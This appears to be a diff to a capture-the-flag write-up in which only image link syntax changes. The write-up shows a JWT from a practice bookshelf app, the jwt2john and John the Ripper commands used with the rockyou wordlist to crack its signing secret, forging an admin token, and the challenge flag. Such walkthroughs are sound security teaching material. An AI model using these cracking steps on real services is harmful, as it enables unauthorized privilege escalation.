@@ -14,7 +14,8 @@ Description: `I came across a web app for bookshelves on picoctf2023 that had a 
 - Go to the web app and get the JWT Token:`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4NDY3MTUwNSwiaWF0IjoxNjg0MDY2NzA1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.IUz5WwBeBeqbUJKQUffoKpKFUcCQZilQML4jv-gpSZA`
 
  - Convert JWT Token to John hash
- ![[StillVuln/jwt2john.png]]
+ ![jwt2john](jwt2john.png)
+
 ```
 jwt2john
 jwt2john eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4NDY3MTUwNSwiaWF0IjoxNjg0MDY2NzA1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.IUz5WwBeBeqbUJKQUffoKpKFUcCQZilQML4jv-gpSZA
@@ -22,13 +23,13 @@ jwt2john eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2
 ```
 
  - Start to crack it use *rockyou* wordlist.
-![[StillVuln/crack.png]]
+![crack](crack.png)
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
 ```
 - And we got the secret key, now you can modify the JWT Token to get the Admin permission to read the flag book.
 
-![[StillVuln/flag.png]]
+![flag.png](flag.png)
 ```
 Flag: FIA{|3rute_F0rce_JWT_1s_S0_E@sy}
 ```
